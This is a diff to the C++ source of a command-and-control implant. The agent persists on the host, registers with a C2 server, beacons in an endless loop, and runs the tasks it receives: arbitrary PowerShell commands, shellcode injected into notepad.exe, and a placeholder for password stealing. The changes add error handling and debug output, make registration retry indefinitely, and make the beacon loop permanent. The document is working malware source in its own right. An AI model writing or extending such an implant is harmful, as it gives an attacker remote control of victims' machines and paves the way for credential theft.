@@ -164,9 +164,16 @@ BOOL registerAgent() {
     if (response == "Error") {
         return FALSE;
     }
-    std::cout << response << std::endl;
 
-    json jsonResponse = json::parse(response);
+    json jsonResponse;
+    try {
+        jsonResponse = json::parse(response);
+    } catch (std::exception e) {
+        std::cout << e.what() << std::endl;
+        return FALSE;
+    }
+
+    std::cout << response << std::endl;
 
     if (jsonResponse["status"] == "ok") {
         return TRUE;
@@ -180,6 +187,7 @@ void executeTasks(std::vector<json> tasks) {
     for (int i = 0; i < tasks.size(); i++) {
         // json task = json::parse(tasks[i]);
         json task = tasks[i];
+        printf("[+] new task %s %s\n", task["command_type"], task["cmd"]);
         if (task["command_type"] == "powershell_cmd") {
             std::string cmd = task["cmd"];
             std::string result = exec_shell(&*( cmd.begin() ));
@@ -200,7 +208,15 @@ void executeTasks(std::vector<json> tasks) {
                 return;
             }
 
-            std::cout << response << std::endl;
+            json jsonResponse;
+            try {
+                jsonResponse = json::parse(response);
+            } catch (std::exception e) {
+                std::cout << e.what() << std::endl;
+                return;
+            }
+
+            std::cout << response << std::endl << std::endl;
         } else if (task["command_type"] == "steal") {
             std::cout << "steal some passwords (placeholder)" << std::endl;
             // add implementation here
@@ -220,7 +236,15 @@ void executeTasks(std::vector<json> tasks) {
                 return;
             }
 
-            std::cout << response << std::endl;
+            json jsonResponse;
+            try {
+                jsonResponse = json::parse(response);
+            } catch (std::exception e) {
+                std::cout << e.what() << std::endl;
+                return;
+            }
+
+            std::cout << response << std::endl << std::endl;
 
         } else if (task["command_type"] == "shellcode") {
             std::string exePath = "C:\\WINDOWS\\System32\\notepad.exe";
@@ -244,10 +268,21 @@ void executeTasks(std::vector<json> tasks) {
                 return;
             }
 
-            std::cout << response << std::endl;
+            json jsonResponse;
+            try {
+                jsonResponse = json::parse(response);
+            } catch (std::exception e) {
+                std::cout << e.what() << std::endl;
+                return;
+            }
+
+            std::cout << response << std::endl << std::endl;
         } else if (task["command_type"] == "change_config") {
-            std::cout << "change some configuration (placeholder)" << std::endl;
             // add implementation here
+            std::string strST = task["cmd"];
+            int s = std::stoi(strST);
+            sleepTime = s * 1000;
+            std::cout << "sleep time set to " << strST << std::endl;
 
             json jsonResult = {
                 {"job_id", task["job_id"]},
@@ -264,7 +299,15 @@ void executeTasks(std::vector<json> tasks) {
                 return;
             }
 
-            std::cout << response << std::endl;
+            json jsonResponse;
+            try {
+                jsonResponse = json::parse(response);
+            } catch (std::exception e) {
+                std::cout << e.what() << std::endl;
+                return;
+            }
+
+            std::cout << response << std::endl << std::endl;
         }
         
     }
@@ -284,8 +327,14 @@ void getTasksAndExecute() {
         return;
     }
 
-    json jsonResponse = json::parse(response);
-
+    json jsonResponse;
+    try {
+        jsonResponse = json::parse(response);
+    } catch (std::exception e) {
+        std::cout << e.what() << std::endl;
+        return;
+    }
+    
     if (jsonResponse["status"] == "ok") {
         std::cout << jsonResponse["tasks"] << std::endl;
         std::vector<json> tasks = jsonResponse["tasks"];
@@ -340,21 +389,23 @@ int main(int argc, char* argv[]){
         return 0; // Exit program
     }
 
+    // FreeConsole();
+
     persist();
 
     agentId = getProfileID();
 
     BOOL registered = FALSE;
     do {
+        std::cout << "tring to register on c2 server" << std::endl;
         registered = registerAgent();
+        Sleep(sleepTime);
     } while (!registered);
 
-    int i = 3;
-    while(i > 0) {
+    while(1) {
         std::cout << "wake up" << std::endl;
         getTasksAndExecute();
         Sleep(sleepTime);
-        i--;
     }
 
     // Upon app closing:
